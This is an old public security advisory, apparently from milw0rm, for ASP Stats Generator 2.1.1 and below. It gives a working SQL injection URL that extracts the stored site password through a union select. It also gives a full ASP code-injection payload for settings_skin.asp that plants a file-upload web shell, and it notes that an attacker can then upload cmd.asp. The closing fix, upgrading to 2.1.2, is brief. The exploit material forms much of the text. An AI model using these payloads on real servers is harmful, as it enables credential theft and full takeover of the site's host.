<html><head><title>ASP Stats Generator <= 2.1.1 SQL Injection Vulnerabilities</title></head><pre>/*------------------------------------------------
		IHS Public advisory 
-------------------------------------------------*/

ASP Stats Generator SQL-ASP injection - Code Excution 
ASP Stats Generator is a powerful website counter, completely written in ASP programming language.
The application is able to track web site activity generating graphical and statistical reports.
It combines a server side class with a javascript system to get a wide range of visitors' details.
http://www.weppos.com

Credit:
The information has been provided by Hamid Ebadi (IHS : IRAN HOMELAND SECURITY)
The original article can be found at: 

http://www.IHSteam.com
http://www.hamid.ir/security/


Vulnerable Systems:
ASP Stats Generator 2.1.1 - 2.1 and below

SQL injection :

Example :
The following URL can be used to trigger an SQL injection vulnerability in the pages.asp:
http://localhost/myasg/pages.asp?order='&amp;mese=1

Microsoft JET Database Engine error '80040e14' 
Syntax error in string in query expression 'SUM(Visits) ''. 
/myasg/pages.asp, line 236 

Exploit :

http://localhost/asg/pages.asp?order=ASC union select sito_psw,1,1 from tblst_config&amp;mese=1


ASP Code Injection  :
Input passed to the strAsgSknPageBgColour (and ...) in &quot;settings_skin.asp&quot;  isn't properly sanitised before being stored in the &quot;inc_skin_file.asp&quot;.
This can be exploited to inject  arbitrary ASP code.

Exploit :

#F9F9F9&quot; : dim path,hstr, mpath, content, filename: mpath=replace(Request.ServerVariables(&quot;PATH_TRANSLATED&quot;),&quot;/&quot;,&quot;\&quot;): content = request(&quot;content&quot;): filename = request(&quot;filename&quot;): on error resume next: Dim objFSO,f: Set objFSO = Server.CreateObject (&quot;Scripting.FileSystemObject&quot;): if not filename = &quot;&quot; then: response.Write( &quot;Have File.&lt;BR&gt;&quot; ): path = objFSO.GetParentFolderName( mpath ): path = filename: end if: if not content=&quot;&quot; then: response.Write( &quot;Contented.&lt;BR&gt;&quot; ): set f = objFSO.CreateTextFile( path ): response.Write( err.Description &amp; &quot;&lt;BR&gt;&quot; ): f.Write( content ): response.Write( err.Description &amp; &quot;&lt;BR&gt;&quot; ): f.close: end if	%&gt;&lt;%=filename%&gt;&lt;BR&gt;&lt;%=path%&gt;&lt;BR&gt;&lt;%= Request(&quot;path&quot;) %&gt;&lt;BR&gt;&lt;FORM ID=&quot;SForm&quot; method=&quot;post&quot;&gt;&lt;TABLE width=&quot;300&quot; border=&quot;1&quot; ID=&quot;Table1&quot;&gt;&lt;TR&gt;&lt;TD&gt;&lt;P align=&quot;center&quot;&gt;&lt;STRONG&gt;&lt;FONT size=&quot;6&quot;&gt;Upload File&lt;/FONT&gt;&lt;/STRONG&gt;&lt;/P&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;&lt;TEXTAREA name=&quot;content&quot; rows=&quot;15&quot; cols=&quot;46&quot; &gt;&lt;%=content%&gt;&lt;/TEXTAREA&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;TR&gt;&lt;TD&gt;&lt;P align=&quot;center&quot;&gt;File Name:&lt;%=strAsgMapPathTo%&gt;&lt;INPUT type=&quot;text&quot; name=&quot;filename&quot; value=&quot;&lt;%=filename%&gt;&quot; &gt;&lt;/P&gt;&lt;P align=&quot;center&quot;&gt;&lt;INPUT type=&quot;submit&quot; value=&quot;Upload&quot; ID=&quot;Submit1&quot; NAME=&quot;Submit1&quot;&gt;&lt;/P&gt;&lt;/TD&gt;&lt;/TR&gt;&lt;/TABLE&gt;&lt;/FORM&gt;&lt;% objFSO = Nothing: on error goto 0: hstr = &quot;
[m.r.roohian]
attacker can upload  &quot;cmd.asp&quot; with this uploader and ...


Solution:
use ASP Stats Generator v2.1.2 (18/06/2006 )

# milw0rm.com [2006-06-19]</pre></html>